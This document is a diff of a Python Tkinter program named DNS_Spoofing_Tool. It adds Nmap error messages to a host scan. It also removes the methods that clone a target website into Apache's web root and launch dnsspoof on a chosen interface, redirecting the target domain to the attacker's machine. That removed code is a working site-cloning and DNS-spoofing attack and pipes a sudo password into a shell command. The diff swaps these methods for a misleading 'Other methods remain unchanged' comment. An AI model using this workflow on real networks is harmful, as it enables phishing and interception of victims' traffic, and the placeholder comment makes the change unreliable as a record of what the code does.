@@ -5,7 +5,6 @@ from tkinter import filedialog, messagebox, simpledialog, ttk
 import netifaces
 import nmap
 import threading
-import getpass
 
 class Tooltip:
     def __init__(self, widget, text):
@@ -133,92 +132,15 @@ class DNS_Spoofing_Tool:
                 # Scan hosts in the given IP range
                 nm.scan(hosts=ip_range_input, arguments='-sn', callback=callback_result, callback_progress=callback_progress)
 
+                # Add handling for Nmap errors
+                if nm.all_hosts():
+                    messagebox.showinfo("Scan Completed", "IP scan completed successfully!")
+                else:
+                    messagebox.showinfo("Scan Completed", "No hosts found in the specified IP range.")
+
+        except nmap.PortScannerError as e:
+            messagebox.showerror("Nmap Error", f"Nmap encountered an error: {e}")
         except Exception as e:
             messagebox.showerror("Error", f"An error occurred while scanning IPs: {str(e)}")
 
-    def download_website(self, url, folder_path):
-        # Download website contents and save locally
-        response = requests.get(url)
-        soup = BeautifulSoup(response.content, 'html.parser')
-        
-        # Create folder if not exists
-        if not os.path.exists(folder_path):
-            os.makedirs(folder_path)
-
-        # Save HTML file
-        html_file_path = os.path.join(folder_path, 'index.html')
-        with open(html_file_path, 'w') as file:
-            file.write(soup.prettify())
-
-        # Download and save CSS files
-        css_file_paths = []
-        for link in soup.find_all('link', href=True):
-            css_url = link['href']
-            if css_url.startswith(('http://', 'https://')):
-                css_response = requests.get(css_url)
-                css_file_name = re.sub(r'\W+', '', os.path.basename(css_url))  # Remove non-alphanumeric characters
-                css_file_path = os.path.join(folder_path, css_file_name)
-                with open(css_file_path, 'wb') as css_file:
-                    css_file.write(css_response.content)
-                css_file_paths.append(css_file_path)
-
-        # Download and save JavaScript files
-        js_file_paths = []
-        for script in soup.find_all('script', src=True):
-            js_url = script['src']
-            if js_url.startswith(('http://', 'https://')):
-                js_response = requests.get(js_url)
-                js_file_name = re.sub(r'\W+', '', os.path.basename(js_url))  # Remove non-alphanumeric characters
-                js_file_path = os.path.join(folder_path, js_file_name)
-                with open(js_file_path, 'wb') as js_file:
-                    js_file.write(js_response.content)
-                js_file_paths.append(js_file_path)
-
-        return html_file_path, css_file_paths, js_file_paths
-
-    def select_folder(self):
-        # Opens file dialog to select folder for downloaded website files
-        self.downloaded_folder = filedialog.askdirectory()
-
-    def start_dns_spoofing(self):
-        try:
-            # Get Parrot Linux IP, target URL, and selected network interface
-            parrot_ip = self.parrot_ip_entry.get()
-            target_url = self.target_url_entry.get()
-            selected_interface = self.interface_var.get()
-
-            # Download website contents
-            if self.downloaded_folder:
-                html_file_path, css_file_paths, js_file_paths = self.download_website(target_url, self.downloaded_folder)
-
-                # Update hosts.txt with Parrot Linux IP and target URL
-                hosts_file_path = "/tmp/hosts.txt"
-                with open(hosts_file_path, "w") as f:
-                    f.write(f"{parrot_ip} {target_url}")
-
-                # Move downloaded website files to Apache's root directory
-                shutil.move(html_file_path, "/var/www/html/")
-                for css_file_path in css_file_paths:
-                    shutil.move(css_file_path, "/var/www/html/")
-                for js_file_path in js_file_paths:
-                    shutil.move(js_file_path, "/var/www/html/")
-
-                # Get sudo password
-                sudo_password = simpledialog.askstring("Password", "Enter your sudo password:", show="*")
-                if sudo_password:
-                    # Start DNS spoofing with selected network interface
-                    command = f"echo {sudo_password} | sudo -S dnsspoof -i {selected_interface} -f {hosts_file_path}"
-                    subprocess.Popen(command, shell=True)
-                    messagebox.showinfo("Success", "DNS Spoofing started successfully!")
-                else:
-                    messagebox.showerror("Error", "Password not provided.")
-
-            else:
-                messagebox.showerror("Error", "Please select a folder for downloaded website files.")
-        except Exception as e:
-            messagebox.showerror("Error", f"An error occurred: {str(e)}")
-
-if __name__ == "__main__":
-    root = tk.Tk()
-    dns_spoofing_tool = DNS_Spoofing_Tool(root)
-    root.mainloop()
+    # Other methods remain unchanged
